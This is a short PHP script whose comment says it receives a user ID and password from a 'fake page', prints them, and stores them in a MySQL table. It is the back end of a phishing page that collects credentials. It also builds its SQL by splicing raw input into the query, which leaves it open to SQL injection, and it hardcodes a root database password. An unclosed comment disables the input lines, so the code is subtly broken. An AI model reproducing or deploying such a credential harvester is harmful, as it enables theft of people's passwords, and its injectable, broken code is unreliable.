

<?php

header("Content-Type:text/html;charset=utf-8"); 




	/* connect to mysql */
	$s = mysqli_connect("localhost", "root", "1234") or die("failed");


	/* notify mysql utf-8, avoid korean character crashing */
	mysqli_query($s, "set session character_set_connection=utf8;");
	mysqli_query($s, "set session character_set_results=utf8;");
	mysqli_query($s, "set session character_set_client=utf8;");


	/* select db */
	mysqli_select_db($s, "mydb");



	/* receives id, password from fake page
	$_id = $_POST["_id"];
	$_pw = $_POST["_pw"];

	print "$_id";
	print "<br>";
	print "$_pw";
	print "<br>";



	/* make sql statement */
	$_USER_INSERT ="INSERT INTO UserAccount(Userid, _Password) VALUES ('"
			."$_id"
			."', '"
			."$_pw"
			."')";

		

	/* INSERT SQL stmt */
	mysqli_query($s, "$_USER_INSERT");



	/* disconnect */
	mysqli_close($s);



?>